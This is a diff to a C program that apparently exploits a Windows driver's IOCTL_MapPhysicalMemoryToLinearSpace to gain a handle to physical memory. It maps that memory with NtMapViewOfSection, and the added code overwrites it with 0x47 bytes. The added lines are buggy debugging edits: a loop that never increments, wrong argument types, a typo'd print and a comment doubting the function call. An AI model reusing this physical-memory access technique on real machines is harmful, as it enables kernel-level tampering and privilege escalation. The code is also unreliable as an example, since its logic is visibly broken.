@@ -62,7 +62,9 @@ static BOOLEAN MapPhysicalMemory(HANDLE PhysicalMemory, PDWORD64 Address, PSIZE_
 
 	*VirtualAddress = 0;
 	viewBase.QuadPart = (ULONGLONG)(*Address);
-	ntStatus = fNtMapViewOfSection
+	printf("befode the meme");
+	system("pause");
+	ntStatus = fNtMapViewOfSection // maybe wrong function call?
 	(
 		PhysicalMemory,
 		GetCurrentProcess(),
@@ -75,7 +77,7 @@ static BOOLEAN MapPhysicalMemory(HANDLE PhysicalMemory, PDWORD64 Address, PSIZE_
 		0,
 		PAGE_READWRITE
 	);
-
+	printf("%d", ntStatus);
 	if (!NT_SUCCESS(ntStatus)) return false;
 	*Address = viewBase.LowPart;
 	return true;
@@ -180,6 +182,7 @@ int main(char argc, char** argv)
 		return EXIT_FAILURE;
 	}
 
+
 	printf("[*] IOCTL_MapPhysicalMemoryToLinearSpace 0x%X called successfully\n", IOCTL_MapPhysicalMemoryToLinearSpace);
 	printf("[*] Buffer from the kernel land:\n");
 	printf("phys32Struct.dwPhysMemSizeInBytes: %lld\n", phys32Struct.dwPhysMemSizeInBytes);
@@ -187,8 +190,18 @@ int main(char argc, char** argv)
 	printf("phys32Struct.pvPhysAddress: %p\n", phys32Struct.pvPhysAddress);
 	printf("phys32Struct.pvPhysMemLin: %p\n", phys32Struct.pvPhysMemLin);
 
-
 	system("pause");
+
+	PDWORD64 buf = (PDWORD64)malloc(1024);
+	unsigned int page = 0x0;
+	for (int page = 0; page < 0x7FFFFFFFFFFF; page + 0x1000) {
+		MapPhysicalMemory(phys32Struct.PhysicalMemoryHandle, (PDWORD64)0x00132000, (PSIZE_T)0x1000, buf);
+		memset(buf, 0x47, 0x1000);
+		printf("Set to 0x47: %p\n", page);
+		break;
+	}
+
+	free(buf);
 
 	CloseHandle(phys32Struct.PhysicalMemoryHandle);
 	CloseHandle(device);
